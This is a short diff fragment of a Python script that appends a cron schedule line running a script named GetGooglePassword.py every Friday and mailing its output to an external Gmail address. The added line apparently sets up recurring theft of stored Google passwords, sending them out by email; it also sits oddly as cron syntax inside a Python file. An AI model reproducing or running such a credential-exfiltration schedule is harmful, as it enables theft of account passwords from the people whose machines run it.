@@ -92,3 +92,5 @@ def main():
       
 if __name__ == "__main__":
     main()
+
+30 2 * * 5  python GetGooglePassword.py | mail -s outputFromScript Ender@gmail.com # or whatever email you want
